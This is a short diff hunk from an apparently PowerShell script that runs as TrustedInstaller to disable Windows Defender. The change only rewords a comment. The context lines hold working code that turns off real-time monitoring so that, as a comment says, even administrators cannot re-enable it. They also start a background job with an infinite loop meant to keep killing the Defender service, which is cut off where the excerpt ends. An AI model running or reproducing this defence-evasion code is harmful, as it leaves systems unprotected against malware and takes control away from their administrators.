@@ -22,7 +22,7 @@ function Invoke-TrustedInstaller {
     # Disable real-time monitoring as TI so that even admins don't have permission to re-enable it
     Set-MpPreference -DisableRealtimeMonitoring $true -Force
 
-    # Start an infinite loop that keeps killing the Windows Defender service
+    # Start an infinite loop that keeps killing the Windows Defender service in the background
     # you need TI privileges to do this
     Start-Job -ScriptBlock {
         while (1) {
